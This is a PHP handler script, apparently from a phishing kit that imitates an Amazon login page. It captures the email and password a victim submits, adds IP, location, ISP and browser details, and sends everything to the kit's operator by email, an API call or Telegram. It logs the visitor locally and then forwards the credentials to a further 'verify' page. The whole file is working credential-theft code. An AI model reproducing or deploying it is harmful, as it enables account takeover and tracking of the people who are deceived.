<?php
session_start();
include'../main.php';
if (!isset($_POST['email'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}else{
$subject = "AMAZON LOGIN 2 [".$_POST['email']."] - [".$cn." - ".$ip." - ".$br."]";
$message = '
===============[ AMAZON LOGIN 2 ]===============<br>
Email : '.$_POST['email'].'<br>
Password : '.$_POST['password'].'<br>
===============[ DEVICE INFORMATION ]===============<br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
Useragent : '.$user_agent.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
OS / Browser : '.$os.' / '.$br.'<br>
Timezone : '.$timezone.'<br>
Date : '.$date.'<br>
===============[ SPM55 - AMAZON ]===============
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'FROM: AMAZON LOGIN 2 <'.$sender_mail.'>' . "\r\n";
api($message,$subject,"email");
if ($send_login == "email") {
mail($email_result, $subject, $message, $headers);
tulis_file("../result/login.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|AMAZON LOGIN 2");
}else{
$message = 'message========[ LOGIN INFORMATION 2 ]=======|Email : '.$_POST['email'].'|Password : '.$_POST['password'].'|=======[ DEVICE INFORMATION ]=======|Country : '.$cn.'|Region : '.$regioncity.'|City : '.$city.'|User Agent : '.$user_agent.'|OS / BR : '.$os.' / '.$br.'|ISP : '.$ispuser.'|IP : '.$ip.'|Timezone : '.$timezone.'|=======[ SPM55 - AMAZON ]=======';
send_telegram($set_ip,$domain,$message);
tulis_file("../result/login.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|AMAZON LOGIN 2");
}

echo "
<form id='boyxd' method='POST' action='../verify'>
<input type='hidden' name='email' value='".$_POST['email']."'>
<input type='hidden' name='pass_log' value='".$_POST['password']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
?>